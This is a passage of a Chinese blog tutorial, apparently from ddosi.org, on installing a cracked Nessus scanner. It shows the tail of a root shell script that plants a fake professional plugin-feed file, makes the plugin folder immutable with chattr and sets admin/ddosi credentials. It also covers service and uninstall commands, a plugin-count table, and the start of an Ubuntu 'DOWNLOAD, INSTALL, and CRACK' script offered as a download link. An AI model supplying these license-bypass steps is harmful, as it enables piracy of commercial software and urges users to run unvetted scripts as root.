variable">$&#123;vernum&#125;</span>";PLUGIN_FEED = "ProfessionalFeed (Direct)";PLUGIN_FEED_TRANSPORT = "Tenable Network Security Lightning";EOF</span><span class="token builtin class-name">echo</span> <span class="token string">" + 保护文件.."</span>chattr <span class="token parameter variable">-i</span> /opt/nessus/lib/nessus/plugins/plugin_feed_info.inc <span class="token operator">&amp;></span>/dev/null<span class="token function">cp</span> /opt/nessus/var/nessus/plugin_feed_info.inc /opt/nessus/lib/nessus/plugins/plugin_feed_info.inc <span class="token operator">&amp;></span>/dev/null<span class="token builtin class-name">echo</span> <span class="token string">" + 设置所有文件为不可变..."</span>chattr +i /opt/nessus/var/nessus/plugin_feed_info.inc <span class="token operator">&amp;></span>/dev/nullchattr +i <span class="token parameter variable">-R</span> /opt/nessus/lib/nessus/plugins <span class="token operator">&amp;></span>/dev/null<span class="token builtin class-name">echo</span> <span class="token string">" + 但是取消关键文件的不可变性.."</span>chattr <span class="token parameter variable">-i</span> /opt/nessus/lib/nessus/plugins/plugin_feed_info.inc <span class="token operator">&amp;></span>/dev/nullchattr <span class="token parameter variable">-i</span> /opt/nessus/lib/nessus/plugins  <span class="token operator">&amp;></span>/dev/null<span class="token builtin class-name">echo</span> <span class="token string">" + 启动服务.."</span>/bin/systemctl start nessusd.service <span class="token operator">&amp;></span>/dev/null<span class="token builtin class-name">echo</span> <span class="token string">" + 再等待 20 秒以便服务器有足够的时间启动！"</span><span class="token function">sleep</span> <span class="token number">20</span><span class="token builtin class-name">echo</span> <span class="token string">" + 监控 Nessus 进度。以下行每 10 秒更新一次直到 100%"</span><span class="token assign-left variable">zen</span><span class="token operator">=</span><span class="token number">0</span><span class="token keyword">while</span> <span class="token punctuation">[</span> <span class="token variable">$zen</span> <span class="token parameter variable">-ne</span> <span class="token number">100</span> <span class="token punctuation">]</span><span class="token keyword">do</span> <span class="token assign-left variable">statline</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">curl</span> <span class="token parameter variable">-sL</span> <span class="token parameter variable">-k</span> https://localhost:11127/server/status<span class="token operator">|</span><span class="token function">awk</span> -F<span class="token string">","</span> <span class="token parameter variable">-v</span> <span class="token assign-left variable">k</span><span class="token operator">=</span><span class="token string">"engine_status"</span> <span class="token string">'&#123; gsub(/&#123;|&#125;/,""); for(i=1;i&lt;=NF;i++) &#123; if ( $i ~ k )&#123;printf $i&#125; &#125; &#125;'</span><span class="token variable">`</span></span> <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$statline</span> <span class="token operator">!=</span> *<span class="token string">"engine_status"</span>* <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span> <span class="token builtin class-name">echo</span> <span class="token parameter variable">-ne</span> <span class="token string">"<span class="token entity" title="\n">\n</span> 问题：Nessus 服务器无法访问？再次尝试..<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">;</span> <span class="token keyword">fi</span> <span class="token builtin class-name">echo</span> <span class="token parameter variable">-ne</span> <span class="token string">"<span class="token entity" title="\r">\r</span> <span class="token variable">$statline</span>"</span> <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$statline</span> <span class="token operator">==</span> *<span class="token string">"100"</span>* <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span> <span class="token assign-left variable">zen</span><span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">;</span> <span class="token keyword">else</span> <span class="token function">sleep</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token keyword">fi</span><span class="token keyword">done</span><span class="token builtin class-name">echo</span> <span class="token parameter variable">-ne</span> <span class="token string">'\n  o 完成!\n'</span><span class="token builtin class-name">echo</span><span class="token builtin class-name">echo</span> <span class="token string">"        访问 Nessus:  https://localhost:11127/ （或您的 VPS IP）"</span><span class="token builtin class-name">echo</span> <span class="token string">"                             用户名: admin"</span><span class="token builtin class-name">echo</span> <span class="token string">"                             密码: ddosi"</span><span class="token builtin class-name">echo</span> <span class="token string">"                             随时可以更改"</span><span class="token builtin class-name">echo</span><span class="token builtin class-name">read</span> <span class="token parameter variable">-p</span> <span class="token string">"按 Enter 键继续"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2.授予执行权限</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> +x nessus.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://www.ddosi.org/wp-content/uploads/2024/01/101357.webp" alt="notion image"></p><p>3.使用root账号执行nessus.sh（请耐心等待）大约10-15分钟。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./nessus.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4.安装完毕如图所示</p><p><img src="https://www.ddosi.org/wp-content/uploads/2024/01/102314.webp" alt="notion image"></p><p>5.打开如下网页即可访问Nessus。</p><p><a href="https://127.0.0.1:11127/">https://127.0.0.1:11127/</a></p><p>或</p><p><a href="https://localhost:11127/">https://localhost:11127/</a></p><p>6.使用账号密码登录</p><table class="notion-simple-table notion-block-2fc01b907bab4bd09f3c092599caeaaa"><tbody><tr class="notion-simple-table-row notion-block-d594d6e1d33d43ea9cc5abcd57811e51"><td class="" style="width:120px"><div class="notion-simple-table-cell">账号</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">密码</div></td></tr><tr class="notion-simple-table-row notion-block-3acf4c40cf834ac5b804407daa7ff971"><td class="" style="width:120px"><div class="notion-simple-table-cell">admin</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">ddosi</div></td></tr></tbody></table><p><img src="https://www.ddosi.org/wp-content/uploads/2024/01/102432.webp" alt="notion image"></p><p><img src="https://www.ddosi.org/wp-content/uploads/2024/01/102615.webp" alt="notion image"></p><p><img src="https://www.ddosi.org/wp-content/uploads/2024/01/102637.webp" alt="notion image"></p><p><img src="https://www.ddosi.org/wp-content/uploads/2024/01/103022.webp" alt="notion image"></p><h2 id="Nessus启动与停止命令"><a href="#Nessus启动与停止命令" class="headerlink" title="Nessus启动与停止命令"></a>Nessus启动与停止命令</h2><p><strong>启动</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl start nessusd <span class="token operator">&amp;&amp;</span> systemctl --no-pager status nessusd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或直接搜索Nessus，点击nessus start即可</p><p><img src="https://www.ddosi.org/wp-content/uploads/2024/01/103213.webp" alt="notion image"></p><p><strong>停止</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl stop nessusd <span class="token operator">&amp;&amp;</span> systemctl --no-pager status nessusd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或直接搜索Nessus，点击nessus stop即可.</p><h2 id="插件数量"><a href="#插件数量" class="headerlink" title="插件数量"></a>插件数量</h2><table class="notion-simple-table notion-block-67a2c5e82f124ca4ae4a886f7b817454"><tbody><tr class="notion-simple-table-row notion-block-7e31b7de260c4f4e8e34a49dbf9318c7"><td class="" style="width:120px"><div class="notion-simple-table-cell">序号</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">插件名称</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">数量</div></td></tr><tr class="notion-simple-table-row notion-block-076bd840d6f4429cba9cdc79304bfaef"><td class="" style="width:120px"><div class="notion-simple-table-cell">1</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">AIX Local Security Checks</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">11551</div></td></tr><tr class="notion-simple-table-row notion-block-606b9eefe06b4299bf10c141e88bc91c"><td class="" style="width:120px"><div class="notion-simple-table-cell">2</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">Alma Linux Local Security Checks</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">1177</div></td></tr><tr class="notion-simple-table-row notion-block-0e93f52b5ade45678ca05529d5e901a1"><td class="" style="width:120px"><div class="notion-simple-table-cell">3</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">Amazon Linux Local Security Checks</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">4216</div></td></tr><tr class="notion-simple-table-row notion-block-66e9a0e6d5d8418e981fd13422d4de9b"><td class="" style="width:120px"><div class="notion-simple-table-cell">4</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">Backdoors</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">123</div></td></tr><tr class="notion-simple-table-row notion-block-477ea87e38d54280bfac76f61ecd433b"><td class="" style="width:120px"><div class="notion-simple-table-cell">5</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">Brute force attacks</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">26</div></td></tr><tr class="notion-simple-table-row notion-block-6dc06042309e4023b383a8d028ebee52"><td class="" style="width:120px"><div class="notion-simple-table-cell">6</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">CentOS Local Security Checks</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">4414</div></td></tr><tr class="notion-simple-table-row notion-block-60f79ddf5006474c9cb847e3588be47a"><td class="" style="width:120px"><div class="notion-simple-table-cell">7</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">CGI abuses</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">5671</div></td></tr><tr class="notion-simple-table-row notion-block-ee3bb465bdfa46e5a15fc01ab4523b21"><td class="" style="width:120px"><div class="notion-simple-table-cell">8</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">CGI abuses : XSS</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">703</div></td></tr><tr class="notion-simple-table-row notion-block-89bfb7686fad441e8a639b784d7032f4"><td class="" style="width:120px"><div class="notion-simple-table-cell">9</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">CISCO</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">2366</div></td></tr><tr class="notion-simple-table-row notion-block-64e2b04686014d1688f35dca2e03b3e8"><td class="" style="width:120px"><div class="notion-simple-table-cell">10</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">Databases</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">969</div></td></tr><tr class="notion-simple-table-row notion-block-c68972640a0b459691c38ab48e92e0d0"><td class="" style="width:120px"><div class="notion-simple-table-cell">11</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">Debian Local Security Checks</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">9196</div></td></tr><tr class="notion-simple-table-row notion-block-4d4cdb4b550d4b02938d964b2dbeae6d"><td class="" style="width:120px"><div class="notion-simple-table-cell">12</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">Default Unix Accounts</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">172</div></td></tr><tr class="notion-simple-table-row notion-block-ba3ac81d2aa24db08cb56da7b86c0ce5"><td class="" style="width:120px"><div class="notion-simple-table-cell">13</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">Denial of Service</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">110</div></td></tr><tr class="notion-simple-table-row notion-block-c2f5b31a3416481ca8cabebd76f6caca"><td class="" style="width:120px"><div class="notion-simple-table-cell">14</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">DNS</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">231</div></td></tr><tr class="notion-simple-table-row notion-block-41994598fd674d60a438cbd46c2fe50f"><td class="" style="width:120px"><div class="notion-simple-table-cell">15</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">F5 Networks Local Security Checks</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">1405</div></td></tr><tr class="notion-simple-table-row notion-block-d8e5773b338144cf92367edc5f177b7b"><td class="" style="width:120px"><div class="notion-simple-table-cell">16</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">Fedora Local Security Checks</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">18304</div></td></tr><tr class="notion-simple-table-row notion-block-19f7cf7fa5d84b7c8817aad8f885721d"><td class="" style="width:120px"><div class="notion-simple-table-cell">17</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">Firewalls</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">414</div></td></tr><tr class="notion-simple-table-row notion-block-4216a21089d44775ac20fb3e83a65dc7"><td class="" style="width:120px"><div class="notion-simple-table-cell">18</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">FreeBSD Local Security Checks</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">5475</div></td></tr><tr class="notion-simple-table-row notion-block-ea4a9c27ff9144ef83a64a80b9a759fe"><td class="" style="width:120px"><div class="notion-simple-table-cell">19</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">FTP</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">272</div></td></tr><tr class="notion-simple-table-row notion-block-fe10d3b5982f4e68858274159f5baaab"><td class="" style="width:120px"><div class="notion-simple-table-cell">20</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">Gain a shell remotely</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">282</div></td></tr><tr class="notion-simple-table-row notion-block-0f4d0d173e834cf6a986f26535c0c523"><td class="" style="width:120px"><div class="notion-simple-table-cell">21</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">General</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">356</div></td></tr><tr class="notion-simple-table-row notion-block-ae15af2480a54d06831a0f4a4d0d92e7"><td class="" style="width:120px"><div class="notion-simple-table-cell">22</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">Gentoo Local Security Checks</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">3519</div></td></tr><tr class="notion-simple-table-row notion-block-5400b4e28abe4e14b403b73ec18aa90a"><td class="" style="width:120px"><div class="notion-simple-table-cell">23</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">HP-UX Local Security Checks</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">1983</div></td></tr><tr class="notion-simple-table-row notion-block-17e2c59faa4f42b99e17e2469a6dea5e"><td class="" style="width:120px"><div class="notion-simple-table-cell">24</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">Huawei Local Security Checks</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">10698</div></td></tr><tr class="notion-simple-table-row notion-block-e9488459ee924a62b927fbc7338ef1c3"><td class="" style="width:120px"><div class="notion-simple-table-cell">25</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">Junos Local Security Checks</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">622</div></td></tr><tr class="notion-simple-table-row notion-block-f10413a2cbdf47a1b62de83db1aca9c6"><td class="" style="width:120px"><div class="notion-simple-table-cell">26</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">MacOS X Local Security Checks</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">2287</div></td></tr><tr class="notion-simple-table-row notion-block-e19dcf75f5c245a9a6fa5e146de1ee73"><td class="" style="width:120px"><div class="notion-simple-table-cell">27</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">Mandriva Local Security Checks</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">3641</div></td></tr><tr class="notion-simple-table-row notion-block-f47a283aba3d48b1a4be21a0ff6e3ef2"><td class="" style="width:120px"><div class="notion-simple-table-cell">28</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">MarinerOS Local Security Checks</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">564</div></td></tr><tr class="notion-simple-table-row notion-block-344195ead14a4d449c2589cbab94e783"><td class="" style="width:120px"><div class="notion-simple-table-cell">29</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">Misc.</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">3657</div></td></tr><tr class="notion-simple-table-row notion-block-af130824d6f044c6bb0648485a5a9c56"><td class="" style="width:120px"><div class="notion-simple-table-cell">30</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">Netware</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">14</div></td></tr><tr class="notion-simple-table-row notion-block-63d2112a315d44659820336c0a0349ea"><td class="" style="width:120px"><div class="notion-simple-table-cell">31</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">NewStart CGSL Local Security Checks</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">1430</div></td></tr><tr class="notion-simple-table-row notion-block-0ccedba6930541dcbd2a500b0bb842ce"><td class="" style="width:120px"><div class="notion-simple-table-cell">32</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">Oracle Linux Local Security Checks</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">6514</div></td></tr><tr class="notion-simple-table-row notion-block-1a21e05da45a42ef8fbb6157199dd675"><td class="" style="width:120px"><div class="notion-simple-table-cell">33</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">OracleVM Local Security Checks</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">602</div></td></tr><tr class="notion-simple-table-row notion-block-ff3f6a99c8654803a2c98143353c15b6"><td class="" style="width:120px"><div class="notion-simple-table-cell">34</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">Palo Alto Local Security Checks</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">170</div></td></tr><tr class="notion-simple-table-row notion-block-1ecab5ebfa574e0ea96626c79f2e8c49"><td class="" style="width:120px"><div class="notion-simple-table-cell">35</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">Peer-To-Peer File Sharing</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">105</div></td></tr><tr class="notion-simple-table-row notion-block-0574dd201ca449f0936907b3db67bc25"><td class="" style="width:120px"><div class="notion-simple-table-cell">36</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">PhotonOS Local Security Checks</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">1895</div></td></tr><tr class="notion-simple-table-row notion-block-6f19a2e306394a27b4ef94913809460e"><td class="" style="width:120px"><div class="notion-simple-table-cell">37</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">Policy Compliance</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">16</div></td></tr><tr class="notion-simple-table-row notion-block-2b84e3dc911046969921a669ee227624"><td class="" style="width:120px"><div class="notion-simple-table-cell">38</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">Red Hat Local Security Checks</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">11595</div></td></tr><tr class="notion-simple-table-row notion-block-02318718146042cbabb4fc8ef3b770e7"><td class="" style="width:120px"><div class="notion-simple-table-cell">39</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">Rocky Linux Local Security Checks</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">1083</div></td></tr><tr class="notion-simple-table-row notion-block-e99ee851c293451299f1c6cc9eb59217"><td class="" style="width:120px"><div class="notion-simple-table-cell">40</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">RPC</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">39</div></td></tr><tr class="notion-simple-table-row notion-block-0504e1ff1e1c45819722721ae76d6421"><td class="" style="width:120px"><div class="notion-simple-table-cell">41</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">SCADA</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">64</div></td></tr><tr class="notion-simple-table-row notion-block-b821439558b74e44989317fc92b8df67"><td class="" style="width:120px"><div class="notion-simple-table-cell">42</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">Scientific Linux Local Security Checks</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">3291</div></td></tr><tr class="notion-simple-table-row notion-block-b9a21087f46244e2b0babc363addd7ed"><td class="" style="width:120px"><div class="notion-simple-table-cell">43</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">Service detection</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">601</div></td></tr><tr class="notion-simple-table-row notion-block-e365add7afbd476ca3852b78d305f25e"><td class="" style="width:120px"><div class="notion-simple-table-cell">44</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">Settings</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">122</div></td></tr><tr class="notion-simple-table-row notion-block-02ac5f4370364b2c8fced9f3d6841d79"><td class="" style="width:120px"><div class="notion-simple-table-cell">45</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">Slackware Local Security Checks</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">1525</div></td></tr><tr class="notion-simple-table-row notion-block-5d92ac9f0cfb45c3a1876bb0e4d342a8"><td class="" style="width:120px"><div class="notion-simple-table-cell">46</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">SMTP problems</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">154</div></td></tr><tr class="notion-simple-table-row notion-block-00e78fa09f7b42cca888f7d220da86d6"><td class="" style="width:120px"><div class="notion-simple-table-cell">47</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">SNMP</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">34</div></td></tr><tr class="notion-simple-table-row notion-block-6673ac2eecf34634a91ee843a136534e"><td class="" style="width:120px"><div class="notion-simple-table-cell">48</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">Solaris Local Security Checks</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">3819</div></td></tr><tr class="notion-simple-table-row notion-block-f288e41b181045d297e19f6be64e7ea6"><td class="" style="width:120px"><div class="notion-simple-table-cell">49</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">SuSE Local Security Checks</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">23108</div></td></tr><tr class="notion-simple-table-row notion-block-f39312a1a7bb4c2e8c29f6dc16fc4cf5"><td class="" style="width:120px"><div class="notion-simple-table-cell">50</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">Tenable.ot</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">1885</div></td></tr><tr class="notion-simple-table-row notion-block-cb8ea64b7eb54d0e8d0e54c70172c4f0"><td class="" style="width:120px"><div class="notion-simple-table-cell">51</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">Ubuntu Local Security Checks</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">7670</div></td></tr><tr class="notion-simple-table-row notion-block-ad397f830921453a94ec1ece9c2256ad"><td class="" style="width:120px"><div class="notion-simple-table-cell">52</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">Virtuozzo Local Security Checks</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">341</div></td></tr><tr class="notion-simple-table-row notion-block-26ddec58cc7746a3b827aeafd06b2cff"><td class="" style="width:120px"><div class="notion-simple-table-cell">53</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">VMware ESX Local Security Checks</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">143</div></td></tr><tr class="notion-simple-table-row notion-block-ba7f57fc0f3c42e280ae5fb407155732"><td class="" style="width:120px"><div class="notion-simple-table-cell">54</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">Web Servers</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">1690</div></td></tr><tr class="notion-simple-table-row notion-block-1333cd257844480caeaf470dabb1470b"><td class="" style="width:120px"><div class="notion-simple-table-cell">55</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">Windows</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">6509</div></td></tr><tr class="notion-simple-table-row notion-block-7e28003d55cd47488c73bb34e3a2d920"><td class="" style="width:120px"><div class="notion-simple-table-cell">56</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">Windows : Microsoft Bulletins</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">3000</div></td></tr><tr class="notion-simple-table-row notion-block-d9305954b704454cad9276a35f708fa8"><td class="" style="width:120px"><div class="notion-simple-table-cell">57</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">Windows : User management</div></td><td class="" style="width:120px"><div class="notion-simple-table-cell">29</div></td></tr></tbody></table> <h2 id="卸载方法"><a href="#卸载方法" class="headerlink" title="卸载方法"></a>卸载方法</h2><p>1.停止Nessus服务。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl stop nessusd <span class="token operator">&amp;&amp;</span> systemctl --no-pager status nessusd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.修改/opt/nessus/文件夹属性</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">chattr <span class="token parameter variable">-i</span> <span class="token parameter variable">-R</span> /opt/nessus/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.卸载Nessus</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> remove nessus<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>问题：在系统或Nessus重启后，扫描按钮可能出现暂时不能用的情况。</p><p>原因：Nessus在重新配置插件。</p><p>解决办法：耐心等待3~5分钟即可。</p><h2 id="Nessus破解版【适用于Ubuntu系统】"><a href="#Nessus破解版【适用于Ubuntu系统】" class="headerlink" title="Nessus破解版【适用于Ubuntu系统】"></a>Nessus破解版【适用于Ubuntu系统】</h2><hr><p>操作方法和上面的一样。</p><p>下载地址：</p><p><a href="https://ddosi-my.sharepoint.com/:u:/g/personal/netsparker_ddosi_onmicrosoft_com/EbIhfsNYkwdPmmv5irgDiJABGTPKCBMvk9YT9_WF8kFEdw?e=gvjtTJ">nessus_ubuntu.sh</a></p><p>或直接复制如下代码保存为nessus_ubuntu.sh</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">id</span> <span class="token parameter variable">-u</span><span class="token variable">)</span></span> <span class="token parameter variable">-ne</span> <span class="token number">0</span> <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span> <span class="token builtin class-name">echo</span> <span class="token string">"Please run as root"</span> <span class="token punctuation">;</span> <span class="token builtin class-name">exit</span> <span class="token number">1</span> <span class="token punctuation">;</span> <span class="token keyword">fi</span><span class="token builtin class-name">echo</span> //<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token builtin class-name">echo</span>   Nessus latest DOWNLOAD, INSTALL, and CRACK   <span class="token parameter variable">-Zen</span> <span class="token number">20230819</span><span class="token builtin class-name">echo</span>   special thanks to John Doe <span class="token keyword">for</span> showing this works on Debian<span class="token builtin class-name">echo</span>   THANKS <span class="token number">369</span> <span class="token keyword">for</span> tip about LATEST as a version number<span class="token builtin class-name">echo</span> //<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token builtin class-name">echo</span> <span class="token string">" o antiskid extra thing added removing all chattr 20231013"</span>chattr <span class="token parameter variable">-i</span> <span class="token parameter variable">-R</span> /opt/nessus<span class="token builtin class-name">echo</span> <span class="token string">" o making sure we have prerequisites.."</span><span class="token function">apt</span> update <span class="token operator">&amp;></span>/dev/null<span class="token function">apt</span> <span class="token parameter variable">-y</span> <span class="token function">install</span> <span class="token function">curl</span> dpkg <span class="token function">expect</span> <span class="token operator">&amp;></span>/dev/null<span class="token builtin class-name">echo</span> <span class="token 